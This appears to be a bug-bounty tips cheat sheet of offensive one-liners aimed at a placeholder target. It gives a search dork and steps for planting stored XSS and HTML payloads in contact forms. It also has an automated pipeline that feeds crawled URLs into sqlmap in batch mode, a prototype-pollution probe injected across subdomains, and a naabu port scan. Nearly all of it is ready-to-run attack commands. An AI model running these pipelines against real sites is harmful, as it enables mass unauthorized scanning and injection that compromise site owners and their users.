# Tips 

------
### Easy Stored XSS & HTML Injection 

* Payload
```
site:target.com inurl:"contact" | inurl:"contact-us" | inurl:"contactus" | inurl:"contcat_us" | inurl:"contact_form" | inurl:"contact-form" 

```
* Fill the form with an HTML Payload in the First Name and with your XSSHunter Payload in Message and send the form

* Wait for a message in your mail with executed Html Payload or your XSSHunter alert for Stored XSS 

----


#### SQLi 

```
httpx -l targets.txt -silent -threads 1000 | xargs -I@ sh -c 'findomain -t @ -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1'
```
-----

#### ProtoType Pollution
```
subfinder -d http://target.com | httpx -silent | sed 's/$/\/?__proto__[testparam]=exploit\//' | page-fetch -j 'window.testparam=="exploit"?"[VULN]":"[NOT]"' | sed "s/(//g"|sed"s/)//g" | sed "s/JS//g" | grep "VULN"
```
------

#### Naabu
```
naabu -l /disk/output/example.com/host.txt  -tp 1000 -sa | httpx -retries 4 -timeout 10 -title -ip

```
